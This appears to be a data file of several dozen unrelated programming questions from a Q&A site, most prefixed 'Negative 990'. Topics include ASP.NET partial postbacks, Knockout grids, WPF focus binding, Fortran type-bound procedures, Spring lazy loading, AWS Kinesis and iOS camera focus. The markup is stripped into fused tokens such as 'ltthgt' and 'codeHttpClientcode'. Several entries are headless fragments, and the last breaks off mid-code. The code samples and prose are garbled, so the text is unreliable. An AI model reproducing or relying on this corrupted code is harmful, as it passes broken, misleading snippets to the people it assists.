Negative 990 pI want my selectable to work as an autopostback control, when something is selected the script clicks on a button and postback the values of the selectable. But it doesnt play to well with my ASP.NET Ajax and UpdatePanels. Sometimes a full postback occurs, and not a partial one.p  pMy conclusions from my debugging is that jQuery does something behind the scene while the stop function runs. If I add an alert to halt the stop function, the partial postback works fine.p  pTo add some more confusion, this works in codeIE9code and codeChromecode, but not in codeIE7code or codeIE8code.

Essentially I have a ListltTgt where T is an MVC view model and the knockout view and view model should be able to work out what they should look like based on T.p  pDoes anyone know of a simple way to display any viewmodel with specific controls for editing based on the viewmodel itself  eg datepicker for dates, input for string, drop downs etc in a grid format and have generic CRUD functions.p  pBelow is an example of the exiting HTML I am using for a specific objectp  precodelttable classtable tablestriped tableborderedgt     lttheadgt         lttrgt         ltthgtValue Dateltthgt         ltthgtPosition Dateltthgt         ltthgtBookltthgt         ltthgtCurrencyltthgt         ltthgtCurrency Baseltthgt         ltthgtAmount1ltthgt         ltthgtAmount2ltthgt         ltthgtPosition Typeltthgt         ltth stylewidth 100px textalignright gt         lttrgt     lttheadgt    lttbody databind templatenametemplateToUse, foreach pagedList gtlttbodygt lttablegt codepre  pand the templates look like thisp  precodeltscript iditemsTmpl typetexthtmlgt lttrgt     lttd databindtext valueDate.formattedDategtlttdgt     lttd databindtext positionDate.formattedDategtlttdgt     lttd databindtext bookgtlttdgt     lttd databindtext currencygtlttdgt     lttd databindtext currencyBasegtlttdgt     lttd databindtext amount1gtlttdgt     lttd databindtext amount2gtlttdgt     lttd databindtext positionTypegtlttdgt     lttd classbuttonsgt         lta classbtn databindclick root.edit href titleeditgtlti classiconpencilgtltigtltagt         lta classbtn databindclick root.remove href titleremovegtlti classicontrashgtltigtltagt     lttdgt lttrgt ltscriptgt  ltscript ideditTmpl typetexthtmlgt lttrgt     lttdgtltinput databinddatepicker valueDate.formattedDate, datepickerOptions  dateFormat yymmdd gtlttdgt     lttdgtltinput databinddatepicker positionDate.formattedDate, datepickerOptions  dateFormat yymmdd gtlttdgt     lttdgtltinput databindvalue bookgtlttdgt     lttdgtltinput databindvalue currencygtlttdgt     lttdgtltinput databindvalue currencyBasegtlttdgt     lttdgtltinput databindvalue amount1gtlttdgt     lttdgtltinput databindvalue amount2gtlttdgt     lttdgtltinput databindvalue positionTypegtlttdgt     lttd classbuttonsgt         lta classbtn btnsuccess databindclick root.save href titlesavegtlti classiconokgtltigtltagt         lta classbtn databindclick root.cancel href titlecancelgtlti classiconremovegtltigtltagt     lttdgt lttrgt ltscriptgt codepre  pI would like the View as well as the View Model to be generic and not hardcoded as above.

Negative 990 pThere is a mobile money transfer service that I am trying to create a web app equivalent for so that I can make transfers from a web app. The way it currently works is as follows p  ul liUser dials 125000 from their mobile li liUser is prompted for 4 digit pin li liAfter authentication, User is presented with menu options, one of which is 4. Send Money li liUser chooses 4 and is prompted for recipients number  User enters recepients number, total and the confirms the transaction and the amount is transferred. li ul  pSo ideally, I want to have people open an online account which they can link to this already existing service. Then from the website, they can perform the transaction that has the same result as above. i.e. send money to a friend by entering their number and authenticating the transaction. So is this at all possible to replicate on a web app since the service is USSD based How would I go about doing it If I were to find an alternative to USSD but still operate consistently with their USSD server or app server but using a different technology, what would be the most ideal workaround What information and access permission would I need to update and perform transaction operations from the host of the current app Do any of the leading SMS APIs like Twilio have any possible influence on such an application p

Negative 990 pIm working on a WordPress website, and Ive run into an issue. The sticky footer Ive implemented works great in every browser but Safari. I think it is some sort of padding issue because adding extra padding to the footer corrects the problem in Safari, but this causes the footer to be taller in other browsers which looks odd. p  pIve been struggling with getting the sticky footer right, and I thought Id figured it out but obviously I havent. Im sure this is a simple fix, but I cannot sort it out.p  pAny help would be greatly appreciated. This is the website a hrefhttpgandyprinters.comwordpress relnofollowgandyprinters.comwordpressa.p  pThanks, Rebeccap  pEDITp  pSomehow Ive managed to correct this issue. I dont know exactly at what point it corrected itself, but it has.p  pThanks to everyone who gave input I really appreciate the time you took to respond and offer help.p

I checked the IIS and the path looked very weird with 2 backslashes.

Ths site worked. li liNow i tried to install a new EPiSite and the error came up that it could not load the ISAPI filters but the path was with double backslash 3.I read on the internet and found a forum thread about the double backs slash that said that it should be changed in the strongCWindowsSystem32inetsrvconfigapplicationHost.configstrong. I checked and the path there was also with doubble slash so i changed it. li liBut now the site gives the same error but with only one back slash. It cant load it.li ol  pI dont understand ISAPI filters very well or the IIS, so i wonder if the backslash is something that should be there or if its a mistake, and ofcourse any help to reconfigure it to work is appreciated. p

Negative 990 pI would like to ask a strongcomplete terminology of OpenId and OAuthstrong. It seems like there are a lot of terms when it is only used the same way. For example, p  ul liClient ID is equivalent to oauthconsumerkey maybe a lot more. li liAnother thing is for the OpenID, what is the term for the URL that is being used aside from OpenIDli ul  pThe terms are very very confusing and it would really help a lot if there is some kind of a thesaurus just for this. It would help because just by reading one article, my brain goes nationwide when searching for the right terms. It pauses. Then thinks like... Wait, am I thinking of the right thingp  pIm talking about OpenId and OAuth in general Google, Facebook, Yahoo, Twitter, StackExchange, etc.p
Negative 990 pIm trying store data in a local databaseSQL CE. Ive set a property of RowObject like thisp  precode    [ColumnIsPrimaryKeytrue,CanBeNullfalse,IsDbGeneratedtrue,AutoSyncAutoSync.OnInsert,DbTypeint NOT NULL IDENTITY]     public int key      get set  codepre  pand the primary key is automatically autoincremented when I insert a new record. But if I remove one or more record and then I insert a new record, its primary key value corresponds at the primary key value of the last inserted record plus one, although that record was deleted. I know it is not possible to update all primary keys. But, is it possible to control the increment of the primary keyand avoid the continuous increment of the primary keyp  pok, thank you for your answer.  I ask because Im worried that PK reaches its maximum value. Maybe this isnt a really problem for my project, but I want understand how handle it, in case it happens. And in case, if it is possible, how can I understand and handle if the database is completely full.p

Negative 990 pIm trying to write a Java client with Apache codeHttpClientcode for the a hrefhttpdevelopers.gengo.comv2apimethods relnofollowGengo APIa which makes use of HTTP GET, POST, PUT and DELETE. However for every RESTful API method that they expose, you must pass your API key and signature as strongparametersstrong.p  pWould this mean query string parameters, POST variables, keyvalue pair headers, or something elsep  pI guess Im just confused by what is meant by the word parameters in the context of all these different HTTP request methods. In other words, how would I pass the API key as a parameter to their API when I could be using GET, POST, PUT or DELETE My emunderstandingem was that only HTTP GET can handle query string params, and that HTTP POST can only handle POST variables. And I have never used PUT or DELETE before so Im not sure what they require.p  pSo I ask what mechanism can I use to send the API keysignature via all 4 types of request methods, or do they all support the processing of query string parameters Thanks in advance.p

Negative 990 pI am trying to retrieve information from a javascript file in my jQuery mobile website.  Ajax is enabled by default, yet when I try xmlHttpRequest.send, the responseText is the source code for the page rather than a json structure.  The initialize function is run at pageinit, so my thinking is that the json it is retrieving should exist when called.  Also, initialize works fine on the nonmobile variant of the site so I think it has something to do with how JQM handles ajax requests.

Negative 990 pI have H.264 stream stored as a file. I am trying to create a MPEG4 file by adding this stream to MDAT BOX. I have created other headers required by MPEG4 standards. But I am unable to read the MPEG4 file.p  pI parsed the H.264 stream and I see that there are multiple Iframes in the file.

I do not get the endBit.p  pWhen i try using FFMPEG to reconvert the MPEG4 file that was created, i get the following error header damaged.

Negative 990 pI have a WPF codeWindowcode that represents a data editor. The codeDataContextcode of the codeWindowcode is of an observable object which implements codeINotifyPropertyChangedcode.p  pEach of the observable objects properties is bound to an appropriate widget in the codeWindowcode codeTextBoxcode for numeric types, codeCheckBoxcode for codeboolcode, etc.. p  pI dont want to have OK and Cancel buttons to persist changed properties Id like the underlying data to be persisted to the observable object when the widget loses focus.p  pTo do this, Ive handled the codePreviewLostKeyboardFocuscode and codeLostFocuscode events for the widget.  My undo framework requires a copy of the observable object representing the current state, and a copy of the new state. The codePreviewLostKeyboardFocuscode event makes a copy of the object, and the codeLostFocuscode event actually performs the save to the database. p  pBut my problem is this the Binding on the field doesnt actually update the underlying observable object until strongafterstrong the codeLostFocuscode event is run. The net effect is that changing the text in a codeTextBoxcode from A to B would persist the data in the field as A. Changing it from A to B to C would persist B.p  pIve put breakpoints in the event handlers and in the setter of the underlying object. Sure enough, codePreviewLostKeyboardFocuscode runs first, then codeLostFocuscode, then finally the observable objects setter.p  pI want to make this as generic as possible, so while I could tell the observable object to update its own property using the codeKeyboardFocusChangedEventArgscode, Id need separate event handlers for each field, and there could be quite a few.p  pIs there any way to get the codeBindingcode to run strongbetweenstrong the codePreviewLostKeyboardFocuscode and codeLostFocuscode eventsp  pXAMLp  precodeltTextBox TextBinding ObjectProperty, StringFormat0F5 LostFocusPersistentTextBoxLostFocus PreviewLostKeyboardFocusPersistentTextBoxPreviewLostKeyboardFocus gt codepre  pEventhandlers in code behindp  precodeprivate void PersistentTextBoxLostFocusobject sender, RoutedEventArgs e      this.ObservableObject.PersistChangesthis.tempObservableObject   private void PersistentTextBoxPreviewLostKeyboardFocusobject sender, KeyboardFocusChangedEventArgs e      this.tempObservableObject  this.ObservableObject  codepre  pcodeObservableObjectcode class setterp  precodepublic class ObservableObject  INotifyPropertyChanged      ...     public Single ObjectProperty          get              return this.objectProperty                  set              this.objectProperty  value             RaisePropertyChangedObjectProperty                codepre  pThanksp

The problem is that, when a cell leaves the visible area, its subviews are not being released. As I move the tableview up and down, the shadow on the added UIView gets darker and darker, and I am guessing the labels are not being released either.p  pHow do I fix this problem I guess I could subclass a UITableViewCell class, but I would just be adding the subviews within a cells class. It doesnt seem to be a solution. Is there a way to make the cell release its subviews when it disappears or a reliable way to truly and freely customize a cellp  pThanksp  pA few additional info I do not use IB do everything programmatically I use ARC I use Xcode 4.6 My SDK is iOS 6.1p

What Im trying to achieve is counting the same terms in both corpuses, even if they are much less frequent in the validation one. In the example then, Id be trying to count occurrences of the word text, even though this would produce a very sparse matrix in the validation case.p

Negative 990 pIts been a while since Ive jumped into C but I want to make sure Im sticking to best practices when I do, including being constcorrect.p  pIm currently building a library of code for a game framework and I have the following classes summarised for simplicityp  precodeclass Screen  public     Clear  codepre  pandp  precodeclass Game  private     Screen screen  protected     const Screen GetScreen const  codepre  pIve omitted the rest for brevity but suffice it to say, the codeGamecode class is responsible for the creation of the codeScreencode class instance.  After it is created, it should only be accessed through the codeGetScreencode method.p  pThe idea is, that when creating a new game, I would inherit from this base class, so as an example, during a render loop I would want to clear the screen to redraw the next frame.  Now, in my above definitions, the codeClearcode method is not allowed to be called when using the codeGetScreencode method because it is not codeconstcode.  The clear method would actually change the internal workings of the class by virtue of the fact that the previously displayed image is cleared so that is why I left the codeconstcode declaration out of the definition. If I made it codeconstcode then I would have to have some of the inner workings of the codeScreencode class as codemutablecode but from what Ive read, this would not be very constcorrect.p  pSo, I have two parts to my question. Should I change codevoid Clearcode to codevoid Clear constcode and make parts of the inner workings codemutablecodep  pOr is the an alternative that would allow me to make the codescreencode member of the codeGamecode class only settable once by the codeGamecode class so that I can access the nonconst member functions during the rest of the programs run time.p  pThanks for any help.p

Negative 990 pstrongExplanationstrong I am able to query the Google Core reporting APIv3 using the client library to get data on pageviews for specific URLs of a website I am working on. I want to get datapageviews for each day within a specified range. So far I am simply looping through the range, sending individual request to the API. in each request I am setting the same value for the start date and the end date. p  pstrongProblemstrong Obviously this gets the job done, BUT it is certainly not the best way to go about it. Because, assumming I want to get data for the past 3 months for each of about 2000 URIs. Then I will need 360000 number of requests and that value is well over the limit quota defined by Google. p  pstrongPotential solutionstrong So one way I thought of solving this issue is probably to send a request setting startdate and enddate to be a week apart but the API will return a sum of the values rather than the individual values. p  pstrongmain questionstrong So is there a way to insist that these values should not be added up and returned as a sum but rather returned as associative array or something like that separately for each.p  pI hope the question is clear and that there is a solution Thank youp
Negative 990 pI have an activity and I would like to divide it into three sections in portrait mode. The middle section has a bunch of buttons, and only buttons in it. However there are far too many buttons to fit inside this middle section. Lets say for example, there are 5x8 buttons on the screen at once. Lets say there are another 5x8 buttons on each side that the user can scroll to.p  pIm looking for a way that the user can flick that middle frame to access the buttons on the left or right. p  pIve tried searching but unfortunately Im still learning Android and I havent got the lingo completely down. Im guessing that Im looking for a way to embed a smaller RelativeLayout within the main RelativeLayout and that smaller one can have multiple buttons and they scroll one page of buttons at a time.

Negative 990 pI am quite new to jquery mobile so this might be a trivial question. The fact that documentation is not centralized for jquery mobile is making me post this on stackoverflow. p  pCurrently, I am trying to load a listview and every item of the listview has the following structure. The options button is a controlgroup button with variable number of buttons below it, again received from the JSON. p  pCurrently there are about 250 objects and they are obtained from the server over an 85 KB JSON. Due to the dynamic nature of the content caching data is a bit tricky. p  pI am running into a problem wherein its taking almost 15 seconds to load this page. To find out the reason causing it I added timestamp values within the for loops that create the list items dynamically. p  pInterestingly the main bottleneck  which is upto 12 out of the 14 seconds is taken while creating the HTML for the controlgroup.  p  pHere is an image of the options button to give you an idea about the HTML p  pI am keen to know why rendering dynamic control groups on list items is causing so much delay. I do not know how to cache the controlgroup since, the grouped buttons are also dynamic and are received from the JSON. p  pimg srchttpi.stack.imgur.comLPeSX.png altenter image description herep  pltimg srchttpi.stack.imgur.comjaqR2.png altenter image description herep  pI look forward to your feedback on this, p  pThanks  Rajat p  pstrongEDIT Code Snippet Added.

If the provided credentials are valid, I from there on have access to the restricted area Fine.p  pBut how do I get that working with AngularJS To login there is a POST API call codeapipublicuserslogincode where you have to provide credentials from a form username and password. p  pThe client side code isp  precodectrls.controllerLoginController, functionscope, http, log, location, UserService, RemoteServerHelperService      scope.loginDataWrong  undefined     scope.login  functioncredentials      http.postRemoteServerHelperService.buildURLpublicuserslogin, credentials         .successfunction data, status              UserService.setLoggedIncredentials.email             scope.loginDataWrong  undefined             location.pathapp             log.infologin attempt successfull.

There are several posts out there which describe the client side code in detail. So this snippet should be enough. p  pThe server side code isp  precodePOST Pathlogin ConsumesMediaType.APPLICATIONJSON public Response loginCredentials credentials, Context HttpServletRequest request      if isAlreadyAuthenticatedrequest          try              request.logout          catch ServletException ex              return Response.statusStatus.CONFLICT.build                     not authenticated     try          request.logincredentials.getEmail, credentials.getPassword         return Response.ok.build      catch ServletException ex          return Response.statusStatus.CONFLICT.build       codepre  pBut however, this does not authenticate the client side for further requests. When I make a API call on a restricted area after successfully login I get a code403 FORBIDDENcode response from the server side. So I assume that I am doing something wrong. Do you have any ideas how to authenticate the client to the server for further requestsp  pA possible solution could be to switch to FORMbased authentication and simply invoke jsecuritycheck with jusername and jpassword, but for now I want to stick with BASICAuthentication and perform the authentication manually via the RESTful API. p  pThe setting codehttpProvider.defaults.withCredentials  truecode somehow doesnt seem to have any effect. p  pstrongUpdatestrongp  pThanks to the tip of lossleader I solved the problem.  I removed the codelogincode method, because I want the Java EEServer to take care of authentication. p  pTo access secured areas the AngularJS webapp has to set the HTTPHeader correctly. In my case codehttp.defaults.headers.common[Authorization]  Basic ltusernamepwgtcode where codeusernamepasswordcode has to be Base64 encoded. p  pAfter I set the headers correctly, no Password Prompt is shown and the AngularJS webapp can access the REST API.p
Negative 990 pI am trying to use a COM visible .NET DLL from Excel VBA. I have been successful when registering the DLL using regasm and then manually adding a reference to it via the Tools  References menu item in the VBA Developer window.p  pHowever, I am now trying to register the DLL without using the regasm command so that the Excel file can be used on any computer without registering the DLL. So far this is what Ive triedp  precodeDim JARTInstance As Object  Sub Initialize     Dim RefPath As String, X As Byte     Const RefName  JART xxx     RefPath  Application.ActiveWorkbook.Path amp JARTJART.dll      With ActiveWorkbook.VBProject.References         For X  1 To .Count             If .ItemX.Description Like RefName Then                 .Remove .ItemX             End If         Next        .AddFromFile RefPath     End With End Sub  Sub PostInitialize     Set JARTInstance  New JART.MainJobControl End Sub codepre  pI have added a reference to Microsoft Visual Basic for Applications Extensibility 5.3. When I run the above code I get Runtime error 48 Error in loading DLL. I have loaded this DLL a couple times using regasm. Do I need to do something like change the GUIDs used in the project and retry. Ive seen code examples where this is supposed to work.p  pIf I reference the tlb file instead of the .dll I do not get the DLL loading error. Instead I get an error whenever I try to use the JARTInstance variable saying that the reference has not been set. Even though PostInitialize gets called directly after Initialize and there is no evidence that any of the code threw an error or failed to run. If I try to put a Stop command in the PostInitialize function it tells me that it Cannot enter breakmode at this time.p  pAny ideas, thanks.p

Negative 990 pI am trying to sort an ArrayList by implementing a similar algorithm I have used to sort arrays.

Right now this code is not sorting properly but rather inserting the lowest number in the array at all subscripts. On a side note I was curious how I could compare the scores at index j and index smallest with the compareTo method as I am comparing objects not primitives I feel it would be a better solution than casting.

Negative 990 pIm building a native Android app for a client and one of the areas of the app allows the user to post their score from a quiz to their Facebook wall. This app is on devices that are handed out to the public and not on their own person device.

I need to keep people within the app. Giving the user the ability to enter Google Play and download the Facebook app or any other app is not going to work.  p  pTheres the added problem that the device has a protective casing that covers the hardware navigation buttons.

I know this is a common practice for differentiating user records.

Is this generally a bad practice  Is containing each users records in the same database acceptable when it comes to security of the individuals records so as long as I prevent SQL injection and XSSp

Negative 990 pIm relatively new to Haskell, and I believe Im misunderstanding something fundamental about type classes.

I dont understand why GHC cant deduce t1  , because the type substituted for t1 is always an instance of T. I see that theres a sort of circular dependency among the instance declarations, e.g. As instance declaration depends on Bs being valid, which depends on As and Cs, and so on, but I feel as though GHC is smart enough to figure that out and Im simply missing something. I always seem to get this error whenever Id like a function in a type class to accept one type in the class but return another... Is there a way to accomplish this with type classesp  pI see that there are many similarlyworded questions here, but I have yet to find one that matches my problemas far as I can tell.p  pThanks in advance.p
Negative 990 pI have never had Apple computer. For a while, I am running Ubuntu on my laptop, and written many programme codes in D2. All of them are terminal applications, there is no GUI.p  pNow I am planning to buy a Macbook, but I am not sure if my programmes will be running as expected on OSX. I am not able to test it, but I thought if I install FreeBSD and compile my codes on it, maybe it will be compiled on OSX as well. Does anyone have experience or knowledge about this Because I am mainly writing programmes for Linux servers, and if OSX will put me into hard situation, I may start considering a normal laptop.p  pP.S. In case anyone asks, I hate graphic applications on Linux, I want OSX, so I can both run Photoshop etc, and also natively run and compile my programmes as well.p  hr  pP.S. In many cases, either Phobos libraries or POSIX codes are used. But there is access to etc, var folders for file access. Shared Memory and Unix Sockets are used as well.p

Negative 990 pIve been programming in Java for a few years however, Im now taking a course which uses Fortran as example code 77 standard.  Although Ive always viewed Fortran as an ancient language, I decided to try out the latest implementation of the 2003 standard using the gfortran compiler to see its merits for myself.  So far, Ive been surprised with the modern features, but I have run into one issue which is demonstrated by the example below.  p  precode    module mod1       type type1         real  x         real  y         contains         procedure  compute       end type type1       contains       subroutine computethis         classtype1  this         thisy  thisx2  1         write , thisx,thisy       end subroutine     end module mod1      module mod2       type type2         real  x         real  y         contains         procedure  compute       end type type2        contains       subroutine computethis         classtype2  this         thisy  thisx  5         write , thisx,thisy       end subroutine     end module mod2      program test       use mod1       use mod2       implicit none       typetype1 myType1       typetype2 myType2       myType1x  4       myType2x  5       call myType1compute       call myType2compute     end program test codepre  pThis produces the compile error  Type mismatch in argument this at 1 passed TYPEtype2 to CLASStype1 in reference to the codecall myType2computecode statement.p  pMy issue is that of scope.  It seems that, through the codeclassltclassnamegt  thiscode statement, the compiler should be able to bind the subroutine to a specific derived type or its descendants.  From here, it doesnt seem conceptually difficult for the compiler to search for a variable definition starting locally in the subroutine then proceeding up the ancestry tree of the specific instance of codethiscode.  This would eliminate all the explicit codethiscode statements which tend to make my typebound procedures difficult to read after several statements.  For example, p  precode    thistempNewxI  thislamdathistempxI112thislamdathistempxIthislamdathistempxI1 codepre  pseems to be much less readwriteable than p  precode    tempNewxI  lamdatempxI112lamdatempxIlamdatempxI1 codepre  pIn the latter case, it is fairly obvious through the codeclassltclassnamegt  thiscode statement, where each variable should be bound.p  pThe other consequence is that it appears that two separate derived types cannot have bound subroutines of the same name as shown by the error message.  Ive seen two common ways around this.  First is to explicitly call each subroutine something like codecomputetype1code and codecomputetype2code.  When accessing these subroutines, this looks very ugly and redundant in code.  For example codecall myType1computetype1code.  The second option, see for example a hrefhttpstackoverflow.comquestions14434293overloadedfortraninterfacewithdifferentranksOverloaded fortran interface with different ranksa, a hrefhttpstackoverflow.comquestions9671723typeboundfunctionoverloadinginfortran2003Typebound function overloading in Fortran 2003a which seems better, is to differentiate the binding name and the procedure name.  For example, the type definition would include codeprocedure  compute type gt computetype1code.  This resolves the issue when accessing the subroutine, but I can see issues when developing large projects with many derived types which implement the same binding name.  Id rather not have to keep track of which subroutine names I have and havent used in any given project.  This would tend to keep names quite long and less readable in the end.p  pSo my question has 3 components  p  ul liAre there cleaner alternatives to the explicit typing of codethisltvarnamegtcode for class members in typebound proceduresli liIs there any way to have the compiler recognize that a procedure should be bound based on the codeclassltclassnamegt  thiscode statement  The current methods of overloading subroutinefunction names seem to be an artifact of the 9095 standard which did not allow these to be bound to types.li liIf not, is there some performance gain associated with this implementation  Both of these issues seem like they could be addressed at compile time, which I would gladly sacrifice for the improved power of expression.li ul

Negative 990 pI have a codedivcode which contains products that you can add by pressing the codeaddcode link. And when you press the codeaddcode link, an info message fades in and after 4 seconds fades out.p  pThis message fades in and out at the top of the codechildboxcontentcode codedivcode which is not visible for the user if he scrolls down in the codedivcode and clicks one of the last codelicode.p  pMy question is, how can I make the codeinfocode codedivcode slide under the Test header in stead This header is always visible to the user.p  pSee a hrefhttpjsfiddle.nete62Wu11 relnofollowjsFiddleap  pEDIT by the way, I cant get the codeinfocode codedivcode to appear in the jsFiddle after an add link is pressed.

Negative 990 pI have a SAS dataset of 60k customers with the following attributesbr 1 customer numberbr 2 X coordinatebr 3 Y coordinatebr 4 store visitsbrp  pI need to calculate the average weighted distance from each customer to all the other customers in the table where each distance is weighted by the comparing customers number of visits.  As an example, the distance between Customer A amp Customer B is 10.  We would then weight that distance by Customer Bs number of visits 2 which equals 5.  This process would repeat for all other customers in the table and we would then average all of these weighted distances for each of the 60k customers.p  pI suppose the brute force way to do this is a Cartesian join ie. create a 60k x 60k  3.6 billion record table but that will likely run out of memory or crash SAS.  I have also thought of breaking this up into more manageable Cartesian joins ie. 10 x 60K  600k x 6000 iterations but this is likely to be quite time consuming  maybe my only choice though.  Im guessing you guysgals know a much better way to do thisp  pI appreciate all your suggestions.p  pThanks for you helpp

Negative 990 pI have a PHP page that displays my MySQL tables data four rows at a time.

Negative 990 pGraphical editors such as Photoshop allow us to alter bitmapped images in the same way that text editors allow us to modify documents. Images are represented as an M x N array of pixels, where each pixel has a given color.p  pYour task is to write a program which simulates a simple interactive graphical editor.p  pInputp  pThe input consists of a sequence of editor commands, one per line. Each command is represented by one capital letter placed as the first character of the line. If the command needs parameters, they will be given on the same line separated by spaces.p  pPixel coordinates are represented by two integers, a column number between 1...M and a row number between 1...N, where 1 leM, N le250. The origin sits in the upperleft corner of the table. Colors are specified by capital letters.p  pThe editor accepts the following commandsp  pI M N    Create a new M x N image with all pixels initially colored white O. C    Clear the table by setting all pixels white O. The size remains unchanged. L X Y C  Colors the pixel X, Y in color C. V X Y1 Y2 C  Draw a vertical segment of color C in column X, between the rows Y1 and Y2 inclusive. H X1 X2 Y C  Draw a horizontal segment of color C in the row Y, between the columns X1 and X2 inclusive. K X1 Y1 X2 Y2 C  Draw a filled rectangle of color C, where X1, Y1 is the upperleft and X2, Y2 the lower right corner. F X Y C  Fill the region R with the color C, where R is defined as follows. Pixel X, Y belongs to R. Any other pixel which is the same color as pixel X, Y and shares a common side with any pixel in R also belongs to this region. S Name   Write the file name in MSDOS 8.3 format followed by the contents of the current image. X    Terminate the session. Outputp  pOn every command S NAME, print the filename NAME and contents of the current image. Each row is represented by the color contents of each pixel. See the sample output.p  pIgnore the entire line of any command defined by a character other than I, C, L, V, H, K, F, S, or X, and pass on to the next command.

They call their account name codewisconsinsponsorcode.  Another user sets up another account called codeiowasponsorcode.   So I want to be able to have the ability that a user could browse to codexyz.comwisconsinsponsorcode and codexyz.comiowasponsorcode and get funneled into the appropriate settings that these users have setup.p  pSo then after I browse to codexyz.comwisconsinsponsorcode which will allow me to get the appropriate settings for wisconsinsponsor I can be dropped onto codexyz.comwisconsinsponsorcontrollermethodcode.p  pSo I added the following code.p  precodepublic static void RegisterRoutesRouteCollection routes      routes.IgnoreRouteresource.axdpathInfo      ListltSponsorgt sponsors  new SponsorContext.Sponsors.ToList      foreach Sponsor sponsor in sponsors               ALL THE PROPERTIES          rentalProperties         routes.MapRoute             name sponsor.SponsorName,             url sponsor.SponsorName  controlleractionid,             defaults new                              controller  Home,                 action  Index,                 id  sponsor.SponsorId                                  routes.MapRoute         name Default,         url controlleractionid,         defaults new               controller  Home,              action  Index,              id  UrlParameter.Optional        codepre  pSo the main goal is that without logging in, I can get information that pertains to each sponsor and then just generic information if a user goes to xyz.com without specifying a sponsor.  The below works to a point for landing on the home page, but then when I navigate to login or any other view, I get for example xyz.com[my first sponsor entry in the database]adminlogin instead of xyz.comadminlogin.  Why doesnt the navigation fall to the Default routep

Negative 990 pI have a client application that talks to a service over WCF. The client and the service both run on the same machine.The service can talk to a database every X minutes. The client only talks to the database when a user presses a button. It is a requirement that the client and service not talk to the database at the same time as sync issues can then occur with data. My proposed solution is that when the user presses the button on the client application that the client stops the service, The client application can then safely makes the database update and finally restarts the service. This will be done via the System.ServiceProcess.dll in c.p  pIs this the best way to do this p

In such a case, it is not good idea to hard code the size of abc string on C side to 4096 bytes. One solution could be to create 2 functions on C side to get the size of the string first.

Negative 990 pIm running into some trouble in my application with a LazyInitializationException. By doing some research I found out a easy solution should be using the OpenEntityManagerInViewFilter feature. Saw a lot of other people with the same problem but cant seem to make it workunderstand. Im using Spring  Hibernate  JPA.p  pI think my problem lies somewhere in the configuration to xml files. I am able to retrieve some object form the database but once I access something that needs to be fetched lazy I get the exception. I know this is happening because my object is detached from the hibernate session. But couldnt find a way to reattach it or use the OpenEntityManangerInView.p  pDo I need to do something in my controller to initiate the EntityManagerInView It does seem like the Filter itself gets called in the stack trace.p  pExample how I fetch my object.p  precodeConfigurableApplicationContext context  new ClassPathXmlApplicationContextapplicationContext.xml TrajectService trajectService

Negative 990 pSo I am trying to find a Dynamic folder. We have made a game and the game has a sound driver which we provided for the players which is optional. When they download the new patch the driver also gets downloaded and put into a folder called Driver. It is a optional driver to install if one would like. I have the installation Registry Key of where it should be installed. I am asking how can I find the folder called Driver that is in the Game Folder that is downloaded but not ran because its optional. I am curios of how can I find that folder and than running the exe file inside that folder. The catch is, not everyone is going to have the folder installed in the same place. Some may have it on the C Driver, other maybe on the D drive and so on. So I am here to ask for some help. The Code is all being written in C.p

In every repository Ive a codePreAuthorizehasAnyRoleROLEcode tag that prevents the client to invoke these method without an authentication.p  pUntil here, all perfect, but Ive a design question. Now I should invoke some methods that works on DB inside a task into my server. I cant call a method of the repository because otherwise I have an Exception due to the fact that the server cant login into itself.p  pSo I read something about the difference between repositories and Dao, and Im asking if the only way is to create a Dao without codePreAuthorizecode tag. I dont love very much this solution because in this way the code that interact with the db is two different places. So if you have CustomerRepository, then you have also to have CustomerDao.p  pHave you some better idea Thanksp

Each folder is containing the text file whose rows are containing the required attributes for furhter analytical work. i have to push all these data to Kinesis Stream. p  pI need code something as below below class putData method wil be used to out in Kinesis streamp  precodepublic class Put       AmazonKinesisClient kinesisClient      Put              String accessKey  My Access Key here          String secretKey  My Secret Key here          AWSCredentials credentials  new BasicAWSCredentialsaccessKey, secretKey        kinesisClient  new AmazonKinesisClientcredentials        kinesisClient.setEndpointkinesis.useast1.amazonaws.com, kinesis, useast1         System.out.printlnstarting the Put Application           public void putDataString fileContent,String session throws Exception               final String myStreamName  ClickStream              PutRecordRequest putRecordRequest  new PutRecordRequest             putRecordRequest.setStreamNamemyStreamName             String putData  fileContent             putRecordRequest.setDataByteBuffer.wrapputData.getBytes             putRecordRequest.setPartitionKeysessionsession             PutRecordResult putRecordResult  kinesisClient.putRecordputRecordRequest             System.out.printlnSuccessfully putrecord, partition key    putRecordRequest.getPartitionKey                      , ShardID    putRecordResult.getShardId             System.out.printlnfileContent             System.out.printlnSequence Number putRecordResult.getSequenceNumber              System.out.printlnData has been PUT successfully         codepre  pHowever reading file from the source folder from the server and then what design i should use to call putData to get the record on Kinesis stream. Do i need infinite loop and reading all files and then do this or some framework which will better do this with care of fault tolerance , single point of failure all . Any help would be greatly appreciated. p  pBriefly I need a better technique to put regularly generated data to Kinesis Stream the data is generated at regular interval to server.  Thanksp
Negative 990 pI was wondering what the AVCaptureDevice settings are for the camera app on iPhone. Specifically the AVCaptureExposureMode, AVCaptureFocusMode, and AVCaptureWhiteBalanceMode. I am trying to make a custom camera and for some reason I cant get the lighting of the photo to change correctly on focusing. I set the ExposurePointOfInterest and the FocusPointOfInterest for my camera, but for some reason it seems as though the camera focuses correctly but the lighting doesnt focus where I tap. When I tap on a dark area it doesnt lighten up like in the camera app. Is there some setting that Im forgetting to set Here is my code for focusing the camera.p  precodeCGPoint touchPoint  [gesture locationInViewcollectView] float focusx  touchPoint.x  collectView.frame.size.width float focusy  touchPoint.y  collectView.frame.size.height NSError tError  nil NSLogprevious .2f, .2f, backCamera.focusPointOfInterest.x, backCamera.focusPointOfInterest.y if isFrontCamera      focusx  collectView.frame.size.width  focusx the view is mirrored for the front camera     if [frontCamera lockForConfigurationamptError]          if [frontCamera isExposurePointOfInterestSupported]              [frontCamera setExposurePointOfInterestCGPointMakefocusx, focusy]             if [frontCamera isExposureModeSupportedAVCaptureExposureModeAutoExpose]                  [frontCamera setExposureModeAVCaptureExposureModeAutoExpose]                               if [frontCamera isFocusPointOfInterestSupported]              [frontCamera setFocusPointOfInterestCGPointMakefocusx, focusy]             if [frontCamera isExposureModeSupportedAVCaptureExposureModeAutoExpose]                  [frontCamera setExposureModeAVCaptureExposureModeAutoExpose]                               if [frontCamera isWhiteBalanceModeSupportedAVCaptureWhiteBalanceModeAutoWhiteBalance]              [frontCamera setWhiteBalanceModeAVCaptureWhiteBalanceModeAutoWhiteBalance]                  [frontCamera unlockForConfiguration]          else          NSLogCouldnt change focus point,tError       else      if [backCamera lockForConfigurationamptError]          if [backCamera 